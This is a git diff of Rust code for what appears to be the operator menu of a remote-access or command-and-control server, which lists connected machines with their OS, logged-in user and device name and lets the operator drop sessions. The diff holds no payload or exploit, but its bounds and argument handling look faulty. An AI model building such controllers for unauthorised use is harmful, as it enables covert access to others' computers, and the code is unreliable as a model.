@@ -29,45 +29,85 @@ fn read_user_input() -> Vec<String> {
 pub async fn main_menu(mut client_list: util::Clients) {
     loop {
         let command = read_user_input();
+        let (command, args) = (&command[0], &command[1..]);
 
-        match command.as_str().trim() {
+        match command.to_lowercase().as_str() {
             "" => continue,
             "help" => {
                 println!("\nsessions - display connected sections\n");
             }
             "sessions" => {
-                println!("");
-
-                for (index, client) in client_list.lock().await.deref().iter().enumerate() {
-                    println!(
-                        "[{}] {} | OS: {} | Current user: {} | Device name: {}",
-                        index,
-                        client.stream.peer_addr().unwrap(),
-                        client.os,
-                        client.username,
-                        client.device_name,
-                    );
+                if client_list.lock().await.len() == 0 {
+                    continue;
                 }
 
                 println!("");
 
-                let session = read_user_input();
+                if args.len() == 0 {
+                    for (index, client) in client_list.lock().await.deref().iter().enumerate() {
+                        println!(
+                            "\t[{}] {} | OS: {} | Current user: {} | Device name: {}",
+                            index,
+                            client.stream.peer_addr().unwrap(),
+                            client.os,
+                            client.username,
+                            client.device_name,
+                        );
+                    }
+                } else {
+                    let session = args.get(1).unwrap();
 
-                let session: usize = match session.trim().parse() {
-                    Ok(session) => session,
-                    Err(e) => panic!("Conversion error: {}", e),
-                };
+                    // Check if typed session is number
+                    let session: usize = match session.parse() {
+                        Ok(session) => session,
+                        Err(_e) => {
+                            println!("[-] Invalid session number [-]\n");
+                            continue;
+                        }
+                    };
 
-                if client_list.lock().await.len() < session {
-                    println!("Incorrect index");
+                    // Check if typed session is out of clients list range
+                    if client_list.lock().await.len() < session {
+                        println!("[-] Incorrect index [-]");
+                        continue;
+                    }
+
+                    match args[0].to_lowercase().as_str() {
+                        "i" => {
+                            println!("{}", args.get(1).unwrap());
+                        }
+                        "r" => {
+                            let client = client_list.lock().await.remove(session);
+
+                            println!(
+                                "[!] {}:{} disconnected [!]",
+                                client.stream.peer_addr().unwrap(),
+                                client.username
+                            );
+                        }
+                        _e => {}
+                    }
                 }
 
-                let mut client = client_list.lock().await.remove(session);
+                println!("");
 
-                match session_menu(client).await {
-                    Ok(changed_client) => client_list.lock().await.push(changed_client),
-                    Err(_e) => _e,
-                }
+                // let session = read_user_input();
+                //
+                // let session: usize = match session.trim().parse() {
+                //     Ok(session) => session,
+                //     Err(e) => panic!("Conversion error: {}", e),
+                // };
+                //
+                // if client_list.lock().await.len() < session {
+                //     println!("Incorrect index");
+                // }
+                //
+                // let mut client = client_list.lock().await.remove(session);
+                //
+                // match session_menu(client).await {
+                //     Ok(changed_client) => client_list.lock().await.push(changed_client),
+                //     Err(_e) => _e,
+                // }
 
                 continue;
             }
